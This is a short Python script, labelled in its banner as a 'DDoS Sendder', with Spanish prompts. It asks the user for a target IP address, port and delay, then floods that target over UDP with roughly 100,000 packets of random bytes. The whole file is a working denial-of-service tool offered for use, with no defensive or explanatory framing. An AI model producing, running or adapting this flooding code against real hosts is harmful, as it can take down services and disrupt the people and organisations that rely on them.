import socket, random, time

s =  socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print('DDoS Sendder By: MrAlb3rto')                        

ip = input("Introduce la IP: ")
port = int(input("Introduce el puerto: "))
sleep = float(input("Sleep: "))

s.connect((ip, port))   

for i in range (1, 100*1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end= '\r')
    time.sleep(sleep)